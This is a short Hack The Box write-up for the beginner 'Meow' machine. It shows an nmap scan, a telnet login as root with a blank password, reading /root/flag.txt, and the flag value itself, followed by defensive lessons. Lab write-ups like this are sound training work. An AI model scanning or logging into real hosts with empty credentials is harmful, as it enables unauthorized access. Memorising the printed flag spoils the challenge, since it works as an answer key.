# Meow — Hack The Box Writeup

- **Difficulty:** Very Easy
- **OS:** Linux
- **Category:** Starting Point
- **Date:** May 2026

---

## Summary
Meow is a beginner-friendly Linux machine exposing a Telnet 
service with no password set on the root account, allowing 
immediate unauthenticated root access.

---

## Recon

### Nmap Scan
```bash
nmap -sV -Pn 10.129.180.152
```

### Results


Only one port open — Telnet on port 23.

---

## Exploitation

Telnet allows remote login. Tried root with no password:

```bash
telnet 10.129.180.152
# login: root
# password: (blank)
```

Got immediate root access.

---

## Flag

cat /root/flag.txt
b40abdfe23665f766f9c61ecba8a4c19

---

## Lessons Learned
- Always scan with `-Pn` if host appears down
- Telnet is insecure and should never be exposed
- Default/empty credentials are a critical misconfiguration
